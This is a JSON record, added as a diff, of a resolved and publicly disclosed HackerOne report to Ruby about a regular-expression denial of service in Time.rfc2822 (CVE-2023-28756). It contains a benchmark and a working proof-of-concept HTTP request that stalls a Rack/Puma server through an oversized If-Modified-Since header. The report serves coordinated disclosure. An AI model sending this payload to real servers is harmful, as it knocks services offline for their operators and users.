@@ -1,0 +1,117 @@
+{
+  "id": 1485501,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDg1NTAx",
+  "url": "https://hackerone.com/reports/1485501",
+  "title": "ReDoS in Time.rfc2822",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-02-18T22:22:29.852Z",
+  "submitted_at": "2022-02-18T22:22:29.876Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-28756"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-05-16T03:07:30.089Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-05-13T20:59:46.553Z",
+  "team_member_agreed_on_going_public_at": "2023-05-16T03:07:29.959Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I found a pattern that occur ReDoS in `Time.rfc2822` (and `Time.rfc822`).\n\nhttps://github.com/ruby/time/blob/v0.2.0/lib/time.rb#L505\n\n```ruby\n    def rfc2822(date)\n      if /\\A\\s*\n          (?:(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\\s*,\\s*)?\n          (\\d{1,2})\\s+\n          (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s+\n          (\\d{2,})\\s+\n          (\\d{2})\\s*\n          :\\s*(\\d{2})\\s*\n          (?::\\s*(\\d{2}))?\\s+\n          ([+-]\\d{4}|\n           UT|GMT|EST|EDT|CST|CDT|MST|MDT|PST|PDT|[A-IK-Z])/ix =~ date\n```           \n\nIt is a detect result by `recheck` ( https://makenowjust-labs.github.io/recheck/ ).\n\n{F1624605}\n\n## PoC\n\n```\n❯ ruby -v\nruby 3.1.1p18 (2022-02-18 revision 53f5fc4236) [arm64-darwin20]\n\n❯ irb\nirb(main):001:0> require 'time'\n=> true\nirb(main):002:0>  Time.rfc2822 \"0 Feb 00 00 :00\" + \" \" * 20000\n# => ReDoS (and raise ArgumentError)\n```\n\n## benchmark\n\nrfc2822_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'time'\n  \ndef rfc2822_parse(length)\n  text = \"0 Feb 00 00 :00\" + \" \" * length\n  Time.rfc2822(text)\nrescue ArgumentError\n  nil\nend\n\nBenchmark.bm do |x|\n  x.report { rfc2822_parse(100) }\n  x.report { rfc2822_parse(1000) }\n  x.report { rfc2822_parse(10000) }\n  x.report { rfc2822_parse(100000) }\nend\n```\n\n```\n❯ bundle exec ruby rfc2822_benchmark.rb\n       user     system      total        real\n   0.000326   0.000009   0.000335 (  0.000344)\n   0.029284   0.000054   0.029338 (  0.029469)\n   2.860528   0.007354   2.867882 (  2.875771)\n 290.843621   0.889107 291.732728 (292.665729)\n```\n\n---\n\n\n## Rack\n\nIn `Rack::ConditionalGet`, the header value is parsed by `Time.rfc2822`, so it is possible to attack from the request.\n\nhttps://github.com/rack/rack/blob/2.2.3/lib/rack/conditional_get.rb#L52\n\n### PoC\n\nGemfile\n\n```\n# frozen_string_literal: true\n\nsource \"https://rubygems.org\"\n\ngem 'rack', '~> 2.2', '>= 2.2.3'\ngem 'puma', '~> 5.6', '>= 5.6.2'\n```\n\nconfig.ru\n\n```ruby\nclass Server\n  def call(env)\n    # puts env\n    [ 200, {}, [\"...\"]]\n  end\nend\n\nuse ::Rack::ConditionalGet\nrun Server.new\n```\n\n```ruby\nrequire 'net/http'\n\nurl = URI.parse('http://127.0.0.1:9292/')\n\nreq = Net::HTTP::Get.new(url.path)\n\nreq['IF_MODIFIED_SINCE'] =  \"0 Feb 00 00 :00\" + \" \" * 20000 + \"+0\"\n\nres = Net::HTTP.start(url.host, url.port) {|http|\n  http.request(req)\n}\nputs res.body\n```\n\n```\n❯ time bundle exec ruby rfc2822_request.rb\n...\nbundle exec ruby rfc2822_request.rb  0.18s user 0.07s system 2% cpu 11.516 total\n```\n\n## Impact\n\nReDoS occurs when `Time.rfc2822` accepts user input.\n\nRails uses `::Rack::ConditionalGet` by default, so it can be attacked by a request from the client.\n\nIf using nginx etc., the header length is limited to about 8k bytes, so it seems to be less affected. ( https://stackoverflow.com/questions/686217/maximum-on-http-header-values )\n\nOn the other hand, puma is susceptible because it can be used up to 80 * 1024.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1624605,
+      "file_name": "recheck_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/evaoc00tz50qnyoc0bwjm0ptn0f5?response-content-disposition=attachment%3B%20filename%3D%22recheck_1.png%22%3B%20filename%2A%3DUTF-8%27%27recheck_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142249Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=51b5a95954fb10e9858d54d8b39771ffa72b4ef99f8384dda8eb1b353a1f095e",
+      "file_size": 453350,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-06-12T20:59:46.650Z",
+  "allow_singular_disclosure_after": -21230583.179670703,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "zy9ard3",
+    "shivammusic",
+    "bij4n53c",
+    "sanjay_0291",
+    "infinityx24"
+  ],
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
